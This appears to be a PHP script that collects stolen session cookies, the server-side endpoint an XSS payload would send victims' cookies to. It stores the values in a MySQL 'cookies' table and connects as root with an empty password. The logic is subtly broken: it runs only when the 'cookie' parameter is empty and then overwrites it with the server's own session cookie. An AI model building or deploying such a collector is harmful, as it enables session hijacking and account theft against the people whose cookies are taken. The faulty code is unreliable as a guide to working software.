<?php 
if (isset($_GET['cookie']) AND is_string($_GET['cookie']) AND empty($_GET['cookie']))
{	
	try {
	$bdd = new PDO('mysql:host=localhost;dbname=test;charset=utf8', 'root', '', array(PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION));
	}
	catch(Exception $e) {
		die('Erreur : '. $e->getMessage());
	}
	$cookie = $_GET['cookie'];
	$cookie = $_COOKIE['session'];
	$site = $_SERVER['HTTP_REFERER'];
	$req = $bdd->prepare('INSERT INTO cookies (value) VALUES (:cookie)') or die(print_r($bdd->errorInfo()));
	$req->execute(array(':cookie' => $cookie));
}
?>